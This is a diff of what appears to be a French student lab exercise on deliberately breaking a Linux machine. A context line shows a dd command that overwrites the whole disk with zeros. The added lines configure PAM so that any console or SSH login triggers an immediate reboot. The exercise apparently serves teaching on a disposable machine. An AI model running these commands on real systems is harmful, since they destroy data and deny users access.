@@ -87,9 +87,13 @@ sudo dd if=/dev/zero of=/dev/sda bs=1M
 ## 5. Malware
 
 🌞 **Reboot automatique**
+```
+sudo nano /etc/pam.d/login
+session optional pam_exec.so /sbin/shutdown -r now
 
-- faites en sorte que si un utilisateur se connecte, ça déclenche un reboot automatique de la machine
-
+sudo nano /etc/pam.d/sshd
+session optional pam_exec.so /sbin/shutdown -r now
+```
 ## 6. You own way
 
 🌞 **Trouvez 4 autres façons de détuire la machine**
